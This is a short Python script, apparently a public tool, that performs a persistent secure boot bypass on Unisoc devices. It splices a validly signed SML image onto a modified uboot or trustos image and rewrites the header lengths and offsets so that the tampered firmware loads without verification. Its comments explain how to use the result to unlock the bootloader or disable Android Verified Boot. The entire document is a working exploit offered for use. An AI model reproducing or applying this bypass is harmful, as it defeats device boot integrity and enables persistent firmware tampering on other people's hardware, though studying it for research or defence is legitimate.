#This is the Unisoc Persistent Secure Boot Bypass
#need a valid sml file and a target file(the file you want to patch)
#After Patching,you can load image file without verification
#You need to modify the target image first,then run this program
#You can modify the patched uboot/lk to unlock bootloader or modify trustos to disable AVB
#For uboot,you need to fix cert offset problem.(Run fix uboot offset script.)
import os
print("First provide a valid sml file.(sml_a.bin/sml.bin).Input file name and then press enter.")
smlname=input()
os.system("chsize.exe \""+smlname+"\"")
with open(smlname,"rb") as file:
    file.seek(0x30)
    lin1=file.read(8)
    smllen=int.from_bytes(lin1,byteorder='little')
    smlflen=file.seek(0,os.SEEK_END)
    file.seek(0x200)
    sml=file.read(smllen+16)
    sml_payload_siz=file.read(8)
    lin1=file.read(8)
    sml_payload_offset=int.from_bytes(lin1,byteorder='little')
    sml_sig_siz=file.read(8)
    lin1=file.read(8)
    sml_sig_offset=int.from_bytes(lin1,byteorder='little')
    sml_cert=file.read()
    file.close()
print("SML_A SIZE:")
print(hex(smllen))
print(smlflen)
print(hex(sml_payload_offset))
print(hex(sml_sig_offset))
print("Then provide your target image file.(The file you want to patch)(e.g. uboot.bin/trustos.bin)(splloader can not be patched.)Input file name and then press enter.")
ubootname=input()
os.system("chsize.exe \""+ubootname+"\"")
with open(ubootname,"rb") as file:
    file.seek(0x30)
    lin1=file.read(8)
    ubootlen=int.from_bytes(lin1,byteorder='little')
    ubootflen=file.seek(0,os.SEEK_END)
    file.seek(0)
    uboot_header_0=file.read(48)
    file.read(16)
    uboot=file.read(ubootflen-64)
    
    file.close()
print(ubootname+" SIZE:")
print(hex(ubootlen))
print(ubootflen)
uboot_newlen=ubootflen-0x200+8+smllen
uboot_certlen=ubootlen
sml_payload_offset=ubootflen+8
sml_sig_offset=sml_sig_offset+ubootflen-0x200+8

print("The patched Filename is "+ubootname+".patched")
with open(ubootname+".patched","wb") as file:
    file.write(uboot_header_0)
    lin1=uboot_newlen.to_bytes(length=8,byteorder="little")
    file.write(lin1)
    lin1=uboot_certlen.to_bytes(length=8,byteorder="little")
    file.write(lin1)
    file.write(uboot)
    file.write(b"\x00\x00\x00\x00\x00\x00\x00\x00")
    file.write(sml)
    file.write(sml_payload_siz)
    lin1=sml_payload_offset.to_bytes(length=8,byteorder="little")
    file.write(lin1)
    file.write(sml_sig_siz)
    lin1=sml_sig_offset.to_bytes(length=8,byteorder="little")
    file.write(lin1)
    file.write(sml_cert)
    file.close()

print("OK!")




